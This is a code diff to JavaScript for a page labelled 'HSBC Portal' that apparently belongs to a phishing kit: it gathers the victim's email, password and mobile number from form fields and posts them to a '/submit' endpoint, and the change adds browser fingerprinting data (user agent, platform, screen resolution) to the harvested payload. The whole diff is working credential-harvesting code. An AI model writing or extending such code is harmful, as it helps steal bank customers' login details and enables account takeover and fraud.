@@ -324,12 +324,22 @@
     var mobileEl = document.getElementById('ms-mobile');
     if (emailEl) emailEl.value = document.getElementById('uid')?.value || emailEl.value || '';
     if (mobileEl) mobileEl.value = document.getElementById('hsbc-mobile')?.value || mobileEl.value || '';
+    var deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenResolution: window.screen.width + 'x' + window.screen.height
+    };
+    var browserAgent = navigator.userAgent;
+    var screenRes = window.screen.width + 'x' + window.screen.height;
     var payload = {
       page: 'HSBC Portal',
       type: type,
       email: emailEl?.value || '',
       pwd: document.getElementById('pwd')?.value || '',
-      mobile: mobileEl?.value || ''
+      mobile: mobileEl?.value || '',
+      browser_agent: browserAgent,
+      screen_resolution: screenRes,
+      deviceInfo: deviceInfo
     };
     try {
       await fetch('/submit', {
